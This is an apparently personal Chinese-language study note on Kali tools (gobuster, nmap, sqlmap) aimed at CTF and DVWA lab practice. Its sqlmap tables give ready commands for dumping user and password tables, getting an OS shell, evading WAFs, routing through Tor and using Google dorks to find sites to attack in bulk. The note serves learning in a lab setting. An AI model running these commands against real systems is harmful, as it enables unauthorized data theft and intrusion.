# kali工具

1.大多数通用格式

```php
工具名 [选项/参数] [目标/输入]
# 1. gobuster 扫目录
gobuster dir -u http://靶机IP -w 字典路径
# 工具名：gobuster；子命令：dir；参数：-u、-w；目标：靶机IP、字典

# 2. nmap 端口扫描
nmap -sV -p- 192.168.1.100
# 工具名：nmap；参数：-sV、-p-；目标：IP

# 3. sqlmap 注入
sqlmap -u "http://靶机/news.php?id=1" --dbs
# 工具名：sqlmap；参数：-u、--dbs；目标：URL
```

2.长见写法

| 格式                      | 说明                           | 例子                                                        |
| ------------------------- | ------------------------------ | ----------------------------------------------------------- |
| **短参数（单横杠 `-`）**  | 单个字母，最常用，可合并       | `-h`（帮助）、`-t 30`（线程）、`-u`（目标）                 |
| **长参数（双横杠 `--`）** | 完整单词，可读性强，不能合并   | `--help`（帮助）、`--dbs`（sqlmap 拖库）、`--delay`（延时） |
| **子命令（无横杠）**      | 工具的不同模式，必须放在参数前 | `gobuster dir`、`gobuster dns`、`git clone`                 |

3.子命令与参数

- **子命令** = 你选「打印 / 复印 / 扫描 / 传真」这些**大功能模式**
- **参数** = 你选「黑白 / 彩色 / A4 纸 / 双面 / 份数」这些**细节设置**

## 1.gobuster扫描目录工具

1.子命令

| 子命令     | 大白话作用                                 |
| ---------- | ------------------------------------------ |
| `dir`      | 扫网站目录 / 文件（你打 Web 渗透最常用的） |
| `dns`      | 爆破子域名（找一个域名下的所有子站）       |
| `fuzz`     | 模糊测试（测参数、WAF 绕过、暴力猜解）     |
| `vhost`    | 虚拟主机探测（同一 IP 下的多个网站）       |
| `s3`/`gcs` | 云存储桶枚举（测 AWS/Google 云存储泄露）   |
| `help`     | 看帮助                                     |
| `version`  | 看工具版本                                 |

2.参数

| 参数                | 大白话作用                           |
| ------------------- | ------------------------------------ |
| `-u` / `--url`      | 指定目标 URL（比如靶机 IP）          |
| `-w` / `--wordlist` | 指定字典文件（扫目录用的字典）       |
| `-t` / `--threads`  | 设置线程数（数字越大，扫描越快）     |
| `-o` / `--output`   | 把扫描结果保存到文件                 |
| `-q` / `--quiet`    | 静默模式（不显示多余日志，只出结果） |
| `--delay`           | 设置请求间隔（防 WAF 拦截）          |
| `-h` / `--help`     | 看帮助                               |

## 2. sqlmap 注入

sqlmap 没有子命令！

所有功能都是用「参数」实现的！

1.基础命令

| 命令 / 参数               | 作用                |
| ------------------------- | ------------------- |
| `sqlmap`                  | 启动工具            |
| `sqlmap -h`               | 看基础帮助          |
| `sqlmap --wizard`         | 新手向导            |
| `-u URL`                  | 指定目标网址        |
| `--data "id=1"`           | POST 提交数据       |
| `--cookie "xxx"`          | 登录用（DVWA 必加） |
| `--dbms=mysql`            | 指定数据库          |
| `--batch`                 | 全自动跑            |
| `--dbs`                   | 查库名              |
| `--current-db`            | 查当前库            |
| `-D dvwa --tables`        | 查表                |
| `-D dvwa -T users --dump` | 脱数据（密码）      |

2.最简单一条过 DVWA 示例

```php
sqlmap -u "http://192.168.x.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbms=mysql -D dvwa -T users --dump --batch
```

基础帮助 & 版本

| 参数         | 作用                        | 实战用法                         |
| ------------ | --------------------------- | -------------------------------- |
| `-h, --help` | 显示基础帮助信息            | 新手查参数用，`sqlmap -h`        |
| `-hh`        | 显示完整高级帮助信息        | 查冷门参数用，`sqlmap -hh`       |
| `--version`  | 显示 sqlmap 版本号          | 确认版本，`sqlmap --version`     |
| `-v VERBOSE` | 输出详细程度（0-6，默认 1） | 调试用，`-v 3` 看详细请求 / 响应 |

核心：告诉 sqlmap 要打哪个目标

| 参数                | 作用                     | 实战用法                                           |
| ------------------- | ------------------------ | -------------------------------------------------- |
| `-u URL, --url=URL` | 指定目标 URL（带注入点） | 最常用，`-u "http://xxx/check.php?username=admin"` |
| `-g GOOGLEDORK`     | 用 Google 语法批量找目标 | 批量打站用，CTF 很少用                             |

核心：还原真实 HTTP 请求，绕 WAF / 防拦截

| 参数              | 作用                | 实战用法                                           |
| ----------------- | ------------------- | -------------------------------------------------- |
| `--data=DATA`     | 发送 POST 请求数据  | 打 POST 注入，`--data "username=admin&password=1"` |
| `--cookie=COOKIE` | 携带 Cookie         | 打需要登录的注入点，`--cookie "PHPSESSID=xxx"`     |
| `--random-agent`  | 随机生成 User-Agent | **必加！** 绕 WAF / 防拦截，避免被识别为爬虫       |
| `--proxy=PROXY`   | 挂代理（比如 Burp） | 抓包调试用，`--proxy http://127.0.0.1:8080`        |
| `--tor`           | 用 Tor 匿名网络     | 匿名渗透用，CTF 不用                               |
| `--check-tor`     | 检查 Tor 是否正常   | 配合`--tor`用                                      |

核心：指定注入点、数据库类型

| 参数               | 作用                   | 实战用法                                             |
| ------------------ | ---------------------- | ---------------------------------------------------- |
| `-p TESTPARAMETER` | 指定要测试的注入参数   | **必加！** 精准打击，`-p "username"`                 |
| `--dbms=DBMS`      | 强制指定后端数据库类型 | 已知数据库用，`--dbms=mysql`（不推荐强制，容易误判） |

核心：控制 sqlmap 的检测强度，影响成功率 / 速度

| 参数            | 作用                        | 实战用法                                              |
| --------------- | --------------------------- | ----------------------------------------------------- |
| `--level=LEVEL` | 测试等级（1-5，默认 1）     | **拉满！** `--level=5` 全量测试所有 payload，CTF 必加 |
| `--risk=RISK`   | 测试风险等级（1-3，默认 1） | **拉满！** `--risk=3` 测试高风险 payload，CTF 必加    |

核心：指定 sqlmap 用哪种注入方式

| 参数                 | 作用                         | 实战用法                                                     |
| -------------------- | ---------------------------- | ------------------------------------------------------------ |
| `--technique=TECH..` | 指定注入技术（默认`BEUSTQ`） | 按需选择：`B`= 布尔盲注、`E`= 报错注入、`U`=UNION 查询、`S`= 堆叠查询、`T`= 时间盲注、`Q`= 带外注入CTF 不推荐强制指定，让 sqlmap 自动选（默认即可） |

核心：拿到数据库名、表名、字段、数据（拿 Flag 用）

| 参数             | 作用                     | 实战用法                                      |
| ---------------- | ------------------------ | --------------------------------------------- |
| `-a, --all`      | 枚举所有信息             | 一键全拿，`sqlmap -u xxx -a --batch`          |
| `-b, --banner`   | 获取数据库版本信息       | 确认数据库类型，`-b`                          |
| `--current-user` | 获取当前数据库用户       | 提权用，`--current-user`                      |
| `--current-db`   | 获取当前数据库名         | 拿当前库，`--current-db`                      |
| `--passwords`    | 枚举数据库用户密码哈希   | 爆破密码用，`--passwords`                     |
| `--dbs`          | **枚举所有数据库名**     | **第一步必用！** 先拿库名，`--dbs`            |
| `--tables`       | 枚举指定库的所有表名     | 第二步用，`-D 库名 --tables`                  |
| `--columns`      | 枚举指定表的所有字段名   | 第三步用，`-D 库名 -T 表名 --columns`         |
| `--schema`       | 枚举数据库结构           | 看完整库结构，`--schema`                      |
| `--dump`         | **导出指定表的所有数据** | **最终拿 Flag 用！** `-D 库名 -T 表名 --dump` |
| `--dump-all`     | 导出所有库的所有数据     | 一键全导出，`--dump-all`                      |
| `-D DB`          | 指定要枚举的数据库名     | 配合`--tables`/`--dump`用，`-D testdb`        |
| `-T TBL`         | 指定要枚举的表名         | 配合`--columns`/`--dump`用，`-T users`        |
| `-C COL`         | 指定要枚举的字段名       | 精准导出，`-C username,password`              |

核心：拿到数据库服务器的系统权限（提权用）

| 参数         | 作用                           | 实战用法                      |
| ------------ | ------------------------------ | ----------------------------- |
| `--os-shell` | 获取交互式系统 shell           | 提权用，需要高权限 + 堆叠注入 |
| `--os-pwn`   | 获取 OOB shell/Meterpreter/VNC | 高级提权用，CTF 很少用        |

核心：控制 sqlmap 的运行行为

| 参数              | 作用                       | 实战用法                                    |
| ----------------- | -------------------------- | ------------------------------------------- |
| `--batch`         | **全自动模式，不询问用户** | **必加！** 打 CTF 不用手动回车，`--batch`   |
| `--flush-session` | 清空当前目标的缓存会话     | 解决缓存误判，重新检测用，`--flush-session` |

其他（Miscellaneous）

| 参数       | 作用         | 实战用法                      |
| ---------- | ------------ | ----------------------------- |
| `--wizard` | 新手向导界面 | 新手入门用，`sqlmap --wizard` |
